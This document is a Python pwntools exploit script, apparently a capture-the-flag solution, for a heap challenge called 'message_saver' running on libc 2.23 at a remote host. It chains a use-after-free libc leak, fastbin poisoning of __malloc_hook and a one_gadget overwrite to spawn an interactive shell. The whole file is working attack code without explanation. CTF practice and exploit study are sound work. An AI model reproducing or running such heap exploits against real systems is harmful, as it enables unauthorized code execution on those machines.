# libc 2.23

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

libc = ELF('./libc.so.6')

def add(idx, topic, size, body):
	r.sendlineafter('>>', '1')
	r.sendlineafter('index', str(idx))
	r.sendafter('topic', topic)
	r.sendlineafter('of body', str(size))
	r.sendafter('body', body)

def edit(idx, topic, body):
	r.sendlineafter('>>', '2')
	r.sendlineafter('index', str(idx))
	r.sendafter('topic', topic)
	r.sendafter('body', body)

def free(idx):
	r.sendlineafter('>>', '3')
	r.sendlineafter('index', str(idx))

def show(idx):
	r.sendlineafter('>>', '4')
	r.sendlineafter('index', str(idx))


#r = process('./message_saver')
r = remote('35.226.111.216', 4444)

add(0, '0', 0x98, 'b')
add(1, '1', 0x60, 'b')

free(0)
show(0)
libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2)-0x3c4b78
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
malloc_hook = libc_base + libc.symbols['__malloc_hook']

print "free_hook @ ", hex(free_hook)
print "system @ ", hex(system)
print "malloc_hook @ ", hex(malloc_hook)

one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_shot = libc_base + one_gadget[2]
print "one_shot @ ", hex(one_shot)

free(1)
edit(1, 'a', p64(malloc_hook-0x23))
add(2, 'a', 0x60, 'a') 
add(2, 'a', 0x60, '\x00'*0x13+p64(one_shot))
r.sendlineafter('>>>', '1')
r.sendlineafter('index', '3')

r.interactive()
